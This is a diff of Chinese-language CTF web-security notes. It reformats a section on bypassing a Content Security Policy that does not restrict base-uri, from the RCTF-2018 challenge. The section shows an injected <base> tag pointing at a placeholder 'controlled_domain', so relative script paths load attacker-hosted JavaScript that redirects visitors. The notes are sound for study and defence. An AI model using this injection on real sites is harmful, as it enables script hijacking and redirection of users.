@@ -215,14 +215,11 @@ js中會用正規表達式來過濾危險字符
 with SSTI  
 * `<base>`覆蓋相對路徑下的js  
 這是我在RCTF-2018中碰到的比賽思路，CSP沒有限制`base-uri`因此可以用`<base>`繞過，而頁面中剛好又有用相對路徑引用外部的js檔，我們便可以自己偽造一個無視CSP的js  
-exploit:  
-頁面中被插入`<base href="http://controlled_domain/">`  
->  
-被引入的`/assets/jquery.min.js`全都變成`http://controlled_domain/assets/jquery.min.js`  
->  
-`controlled_domain/assets/jquery.min.js`我們可以在裡面插入`location.href=url;`  
->  
-當我們訪問最前面被插入`<base>`的頁面時就會被導到這個`url`囉！  
+**Exploit**:  
+:point_down: 頁面中被插入`<base href="http://controlled_domain/">`  
+:point_down: 被引入的`/assets/jquery.min.js`全都變成`http://controlled_domain/assets/jquery.min.js`  
+:point_down: `controlled_domain/assets/jquery.min.js`我們可以在裡面插入`location.href=url;`  
+:point_down: 當我們訪問最前面被插入`<base>`的頁面時就會被導到這個`url`囉！  
 細節詳見：[rblog-writeup](https://github.com/shinmao/CTF-writeups/tree/master/RCTF2018)
 
 
